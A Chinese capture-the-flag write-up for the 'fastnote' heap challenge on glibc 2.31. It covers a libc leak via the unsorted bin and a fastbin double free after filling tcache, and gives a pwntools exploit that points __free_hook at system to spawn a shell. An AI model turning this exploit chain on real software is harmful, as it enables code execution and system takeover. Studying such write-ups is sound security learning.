# fastnote

## 题目简述

程序运行在 glibc 2.31，提供堆块申请、释放和查看功能，并允许重复释放同一索引。该版本 tcache 会检查直接的重复释放，但 fastbin 没有同样的 tcache key 检查；先填满 tcache，再让同尺寸块进入 fastbin，就能构造 `A → B → A` 的 double free 链。

## 解题过程

### 泄露 libc

先申请 8 个请求大小为 `0x80` 的块和一个隔离块，再释放前 8 个。前 7 个进入 tcache，第 8 个进入 unsorted bin；查看后者并减去官方 libc 的 `0x1ecbe0` 偏移即可得到基址。

### 绕过 tcache 检测构造 fastbin double free

对请求大小 `0x10` 的块先填满 tcache。继续释放的块落入 fastbin，按 `A、B、A` 顺序释放可绕过 fastbin 仅检查链表头的限制。随后先分配 7 次耗尽 tcache，再从被污染的 fastbin 链取得重复块。

官方利用的关键序列如下：

```python
from pwn import ELF, p64, u64

libc = ELF("./libc-2.31.so")

# add(index, size, content)、delete(index)、show(index)
# 是题目菜单的直接封装。

for index in range(8):
    add(index, 0x80, b"aaaa")
add(8, 0x10, b"gap")

for index in range(8):
    delete(index)

show(7)
arena_pointer = u64(io.recv(6).ljust(8, b"\x00"))
libc.address = arena_pointer - 0x1ECBE0

free_hook = libc.sym["__free_hook"]
system = libc.sym["system"]

for index in range(10):
    add(index, 0x10, b"aaaa")
add(10, 0x10, b"gap")

for index in range(10):
    delete(index)
delete(8)  # fastbin 中形成 A -> B -> A

# 先耗尽 7 项 tcache。
for index in range(7):
    add(index, 0x10, b"/bin/sh\x00")

# 从重复 fastbin 链中取块并把后续分配导向 __free_hook。
add(7, 0x10, p64(free_hook))
add(8, 0x10, p64(0))
add(9, 0x10, p64(0))
add(10, 0x10, p64(system))

delete(0)
io.interactive()
```

释放索引 0 时，块内容是 `/bin/sh\0`，而 `__free_hook` 已被改成 `system`，因此调用等价于 `system("/bin/sh")`。

## 方法总结

- 核心技巧：填满 tcache 后把释放流量转入 fastbin，再用 `A → B → A` 绕过直接 double free 检查。
- 识别信号：glibc 2.31、菜单允许重复释放、目标尺寸同时受 tcache 和 fastbin 管理。
- 复用要点：必须准确跟踪每次分配来自 tcache 还是 fastbin；`__free_hook` 利用依赖旧版 glibc，换版本后偏移和终点都要重新确认。
